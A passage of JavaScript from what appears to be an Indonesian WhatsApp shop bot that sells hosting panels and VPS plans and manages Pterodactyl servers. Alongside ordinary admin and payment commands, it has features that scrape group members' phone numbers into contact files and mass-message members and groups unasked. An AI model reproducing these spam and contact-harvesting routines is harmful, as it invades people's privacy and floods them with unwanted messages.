* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await yilzi.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

//================================================================================

case "listadmin": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *#- List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await yilzi.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

//================================================================================

case "listpanel": case "listp": case "listserver": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *#- List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await yilzi.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

//================================================================================

case "deladmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================

case "delpanel": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//================================================================================
/*
case "produk": {
await slideButton(m.chat)
}
break
*/
//================================================================================
break
case "savekontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("idgrupnya"))
let res = await yilzi.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer yilzishop - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await yilzi.sendMessage(m.sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./database/contacts.vcf", "")
}}
break
//================================================================================

case "savekontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer yilzishop - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await yilzi.sendMessage(m.sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./database/contacts.vcf", "")
}}
break

//================================================================================

case "pushkontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("idgrup|pesannya"))
if (!text.split("|")) return m.reply(example("idgrup|pesannya"))
const [idgc, pes] = text.split("|")
const teks = pes
const jidawal = m.chat
const data = await yilzi.groupMetadata(idgc)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
const vcard = 'BEGIN:VCARD\n'
+ 'VERSION:3.0\n' 
+ `FN:${namaOwner}\n`
+ 'ORG:Developer;\n'
+ `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
+ 'END:VCARD'
const sentMsg= await yilzi.sendMessage(mem, { contacts: { displayName: namaOwner, contacts: [{ vcard }] }})
await yilzi.sendMessage(mem, {text: teks}, {quoted: sentMsg })
await sleep(global.delayPushkontak)
}}

await yilzi.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//================================================================================

case "pushkontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!text) return m.reply(example("pesannya"))
const teks = text
const jidawal = m.chat
const data = await yilzi.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak*`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
const vcard = 'BEGIN:VCARD\n'
+ 'VERSION:3.0\n' 
+ `FN:${namaOwner}\n`
+ 'ORG:Developer;\n'
+ `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
+ 'END:VCARD'
const sentMsg= await yilzi.sendMessage(mem, { contacts: { displayName: namaOwner, contacts: [{ vcard }] }})
await yilzi.sendMessage(mem, {text: teks}, {quoted: sentMsg })
await sleep(global.delayPushkontak)
}}

await yilzi.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//================================================================================

case "jpmslide": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await yilzi.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await yilzi.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await yilzi.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await yilzi.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpm": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teksnya"))
let allgrup = await yilzi.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await m.reply(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await yilzi.sendMessage(i, {text: `${teks}`}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await yilzi.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpm2": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await yilzi.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await yilzi.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* teks & foto Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await yilzi.sendMessage(i, {image: fs.readFileSync(rest), caption: teks}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await yilzi.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpmtesti": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await yilzi.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await yilzi.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await yilzi.sendMessage(i, {image: await fs.readFileSync(rest), caption: teks, contextInfo: { isForwarded: true, mentionedJid: [m.sender], businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: global.namaSaluran, newsletterJid: global.idSaluran }}}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await yilzi.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "pay": case "payment": {
if (!isCreator) return Reply(mess.owner)
let imgdana = await prepareWAMessageMedia({ image: fs.readFileSync("./src/media/dana.jpg")}, { upload: yilzi.waUploadToServer })
let imgovo = await prepareWAMessageMedia({ image: fs.readFileSync("./src/media/ovo.jpg")}, { upload: yilzi.waUploadToServer })
let imggopay = await prepareWAMessageMedia({ image: fs.readFileSync("./src/media/gopay.jpg")}, { upload: yilzi.waUploadToServer })
let imgqris = await prepareWAMessageMedia({ image: fs.readFileSync("./src/media/qris.jpg")}, { upload: yilzi.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "\nPilih salah satu *payment* pembayaran yang tersedia"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgdana
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Dana Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.dana}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgovo
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"OVO Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.ovo}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imggopay
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Gopay Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.gopay}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgqris
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\" QRIS Payment\",\"url\":\"${global.qris}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}
]
})
})}
}}, {userJid: m.sender, quoted: qtoko})
await yilzi.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}
break

//================================================================================

case "dana": {
if (!isCreator) return
let teks = `
*PAYMENT DANA yilzishop*

* *Nomor :* 085624297893
* *Atas Nama :* M** H****

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await yilzi.sendMessage(m.chat, {text: teks}, {quoted: qtoko})
}
break

//================================================================================

case "qris": {
if (!isCreator) return 
await yilzi.sendMessage(m.chat, {image: {url: global.qris}, caption: "\n*PAYMENT QRIS yilzishop*\n\n*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`"}, {quoted: qtoko})
}
break

//================================================================================

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break

//================================================================================

case "proses": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
const msg = {
text: `*Dana Masuk ✅*
📦 ${text}

_*© 2024 - yilzishop*_`
}
await yilzi.sendMessage(m.chat, msg, {quoted: null})
}
break

//================================================================================

case "done": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
const msg = {
text: `*Transaksi Done ✅*
📦 ${text}

_*© 2024 - yilzishop*_`
}
await yilzi.sendMessage(m.chat, msg, {quoted: null})
}
break


//================================================================================

case "developerbot": case "owner": {
await yilzi.sendContact(m.chat, [global.owner], m)
}
break

//================================================================================

case "save": case "sv": {
if (!isCreator) return
await yilzi.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//================================================================================

case "self": {
if (!isCreator) return
yilzi.public = false
m.reply("Berhasil mengganti ke mode *self*")
}
break

//================================================================================

case "getcase": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./case.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break

//================================================================================

case "ping": case "uptime": {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `
*🔴 INFORMATION SERVER*

*• Platform :* ${nou.os.type()}
*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Core
*• Runtime Vps :* ${runtime(os.uptime())}

*🔵 INFORMATION BOTZ*

*• Respon Speed :* ${latensi.toFixed(4)} detik
*• Runtime Bot :* ${runtime(process.uptime())}
`
await m.reply(respon)
}
break

//================================================================================

case "public": {
if (!isCreator) return
yilzi.public = true
m.reply("Berhasil mengganti ke mode *public*")
}
break

//================================================================================

case "restart": case "rst": {
if (!isCreator) return Reply(mess.owner)
await m.reply("Memproses _restart server_ . . .")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

//================================================================================

case "upchannel": case "upch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya"))
await yilzi.sendMessage(idSaluran, {text: text})
m.reply("Berhasil mengirim pesan *teks* ke dalam channel whatsapp")
}
break

//================================================================================

case "upchannel2": case "upch2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan mengirim foto"))
let img = await yilzi.downloadAndSaveMediaMessage(qmsg)
await yilzi.sendMessage(idSaluran, {image: await fs.readFileSync(img), caption: text})
m.reply("Berhasil mengirim pesan *teks & foto* ke dalam channel whatsapp")
await fs.unlinkSync(img)
}
break

//================================================================================

case "getsc": {
if (!isCreator) return Reply(mess.owner)
let dir = await fs.readdirSync("./database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./database/sampah/${i}`)
}}
await m.reply("Memproses backup script bot")
var name = `Simple-Botz`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await yilzi.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break

//================================================================================

case "resetdb": case "rstdb": {
if (!isCreator) return Reply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
m.reply("Berhasil mereset database ✅")
}
break

//================================================================================

case "setppbot": {
if (!isCreator) return Reply(mess.owner)
if (/image/g.test(mime)) {
var medis = await yilzi.downloadAndSaveMediaMessage(qmsg)
if (args[0] && args[0] == "panjang") {
const { img } = await generateProfilePicture(medis)
await yilzi.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
} else {
await yilzi.updateProfilePicture(botNumber, {content: medis})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
}
} else return m.reply(example('dengan mengirim foto'))
}
break

//================================================================================

case "setimgmenu": {
if (!isCreator) return Reply(mess.owner)
if (!/image/.test(mime)) return m.reply(example('reply fotonya'))
await yilzi.downloadAndSaveMediaMessage(qmsg, "./src/media/menu.jpg", false)
await m.reply("Berhasil mengganti image menu ✅")
}
break

//================================================================================

case "setimgfake": {
if (!isCreator) return Reply(mess.owner)
if (!/image/.test(mime)) return m.reply(example('reply fotonya'))
await yilzi.downloadAndSaveMediaMessage(qmsg, "./src/media/fake.jpg", false)
await m.reply("Berhasil mengganti image fake ✅")
}
break

//================================================================================

case "clearchat": case "clc": {
if (!isCreator) return Reply(mess.owner)
yilzi.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//================================================================================

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *#- List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
yilzi.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

//================================================================================

case "delowner": case "delown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break

//================================================================================

case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break
/*case 'listnokos': {
let imgnya = await prepareWAMessageMedia({ image: await fs.readFileSync("./src/media/fake.jpg")}, { upload: yilzi.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "✨ Tersedia Nokos WhatsApp Kami ✨️"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [
{
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `📌 *Nokos* *Indonesia 🇮🇩*
*💰 Harga : Rp5.000*`
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Yilzi Shop",
 }),
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: false,
...imgnya
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [
{
name: "quick_reply",
buttonParamsJson: "{\"display_text\":\"Buy Nokos\",\"title\":\"*Buy Nokos*\",\"id\":\".ordernokos 1\"}"
}
]
})
},
{
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `📌 *Nokos* *Korea 🇰🇷*
*💰 Harga : 8.000*`
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Yilzi Shop",
 }),
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: false,
...imgnya
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [
{
name: "quick_reply",
buttonParamsJson: "{\"display_text\":\"Buy Nokos\",\"title\":\"*Buy Nokos*\",\"id\":\".nokosnoredy\"}"
}
]
})
},
{
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `📌 *Nokos* *Usa 🇺🇸*
*💰 Harga : 3.000*`
}),
footer: proto.Message.InteractiveMessage.Footer.create({
 text: "© Yilzi Shop",
 }),
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: false,
...imgnya
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [
{
name: "quick_reply",
buttonParamsJson: "{\"display_text\":\"Buy Nokos\",\"title\":\"*Buy Nokos*\",\"id\":\".nokosnoredy\"}"
}
]
})
},
{
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `📌 *Nokos* *Jepang 🇯🇵*
*💰 Harga : 5.000*`
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Yilzi Shop",
 }),
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: false,
...imgnya
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [
{
name: "quick_reply",
buttonParamsJson: "{\"display_text\":\"Buy Nokos\",\"title\":\"*Buy Nokos*\",\"id\":\".nokosnoredy\"}"
}
]
})
},
{
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `📌 *Nokos* *Rusia 🇷🇺*
*💰 Harga : 40.000*`
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Yilzi Shop",
 }),
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: false,
...imgnya
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [
{
name: "quick_reply",
buttonParamsJson: "{\"display_text\":\"Buy Nokos\",\"title\":\"*Buy Nokos*\",\"id\":\".nokosnoredy\"}"
}
]
})
}
]
})
})
}
}
}, {userJid: m.sender, quoted: qloc})

await yilzi.relayMessage(msgii.key.remoteJid, msgii.message, {
messageId: msgii.key.id
})
}
break;
      case "ordernokos":
        {
          await handleOrderNokos(m, db, yilzi, text);
        }
        break;
        case 'nokosnoredy': {
    m.reply(`
*❌ Nokos Tidak Tersedia ❌*

*Mohon tunggu sampai admin melakukan restok kembali.
Terima kasih atas pengertiannya!* 🙏
`)
}*/
break;
//================================================================================
//-# Fitur Order Otomatis Vps Digital Ocean -#//
break
case "belivps": {
let daftarVPS = `
*乂 List paket VPS yang tersedia*

*1.* Ram 1 & CPU 1
*Harga Rp20.000*

*2.* Ram 2 & CPU 1
*Harga Rp35.000*

*3.* Ram 4 & CPU 2
*Harga Rp45.000*

*4.* Ram 8 & CPU 4
*Harga Rp60.000*

*5.* Ram 16 & CPU 4
*Harga Rp80.000*
`
    if (m.isGroup) return m.reply("Pembelian VPS hanya bisa di dalam private chat");
    const tek = text.toLowerCase();
    const Obj = {};

    if (tek === "1") {
        Obj.images = "s-1vcpu-1gb";
        Obj.harga = "20000";
    } else if (tek === "2") {
        Obj.images = "s-1vcpu-2gb";
        Obj.harga = "35000";
    } else if (tek === "3") {
        Obj.images = "s-2vcpu-4gb";
        Obj.harga = "45000";
    } else if (tek === "4") {
        Obj.images = "s-4vcpu-8gb";
        Obj.harga = "60000";
    } else if (tek === "5") {
        Obj.images = "s-4vcpu-16gb";
        Obj.harga = "80000";
    } else return m.reply(daftarVPS);

    const amount = Number(Obj.harga) + generateRandomNumber(110, 250);

    if (fs.existsSync(`./src/gateway/${m.sender.split("@")[0]}.json`)) {
        return await yilzi.sendMessage(m.chat, {
